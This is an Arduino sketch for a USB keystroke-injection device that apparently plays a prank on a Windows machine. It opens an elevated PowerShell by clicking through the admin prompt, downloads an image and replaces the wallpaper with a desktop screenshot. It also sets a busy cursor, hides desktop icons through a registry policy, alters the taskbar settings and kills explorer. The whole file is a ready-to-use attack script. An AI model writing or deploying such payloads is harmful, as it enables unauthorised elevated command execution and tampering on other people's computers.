#include <Keyboard.h>

// Press & release function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(150);
}

// Windows Run function
void winKey(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(250);
}

void setup()
{

  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
    while(1);
  }
  
  Keyboard.begin();

  // Start Payload
  delay(3000);

  // Use this for computers with different layouts
  winKey(114);
  Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
  delay(250);
  typeKey(KEY_RETURN);
  delay(750);
  typeKey(KEY_RETURN);
  delay(250);


  winKey(114);
  Keyboard.print("powershell.exe");
  delay(250);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(1000);  
  
  Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);
  
  Keyboard.print("Invoke-WebRequest <INSERT LINK TO IMAGE> -OutFile C:\\pond\\wallpaper.jpg");
  delay(250);
  typeKey(KEY_RETURN);
  delay(2000);

  Keyboard.print("cd C:\\pond ; mspaint wallpaper.jpg ; exit");
  delay(250);
  typeKey(KEY_RETURN);
  delay(2000);

  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);
  delay(100);

  // Windows + D to show desktop
  winKey(100);


  // Take a screenshot
  Keyboard.press(KEY_LEFT_SHIFT);
  winKey(115);
  delay(750);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_RETURN);
  delay(750);

  // Open paint, paste the screenshot and set it as wallpaper
  winKey(114);
  Keyboard.print("mspaint");
  delay(250);
  typeKey(KEY_RETURN);
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(118);
  Keyboard.releaseAll();
  delay(250);
  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);
  typeKey(KEY_RETURN);
  delay(100);
  typeKey(KEY_RETURN);
  delay(250);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(100);
  
  // Open mouse config
  winKey(114);
  Keyboard.print("control main.cpl");
  delay(100);
  typeKey(KEY_RETURN);
  delay(500);

  // Set cursor to "Busy"
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  typeKey(KEY_RIGHT_ARROW);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_RETURN);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  typeKey(KEY_TAB);
  Keyboard.print("aero_unavail");
  typeKey(KEY_RETURN);
  typeKey(KEY_TAB);
  typeKey(KEY_RETURN);

  
  // Removing icons and setting taskbar to auto hide on top
  winKey(114);
  Keyboard.print("powershell.exe");
  delay(250);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(250);  

  Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer C:\\pond\\explorerPolicies.reg");  
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);
  
  Keyboard.print("New-Item -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies -Name Explorer -Force");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);
  
  Keyboard.print("New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer -Name NoDesktop -PropertyType Dword -Value 1 -Force");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);
  
  Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3\\ C:\\pond\\stuckrects3.reg");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);

  Keyboard.print("Set-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Explorer/StuckRects3 -Name Settings -Value ([byte[]](0x30,0x00,0x00,0x00,0xFE,0xFF,0xFF,0xFF,0x03,0x10,0x00,0x00,0x01,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x38,0x04,0x00,0x00,0x78,0x00,0x00,0x00,0x01,0x00,0x00,0x00))");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);

  Keyboard.print("Stop-Process -Name explorer -Force ; exit");
  delay(250);
  typeKey(KEY_RETURN);
  delay(250);

  // End Payload

  Keyboard.end();
}


void loop() {}
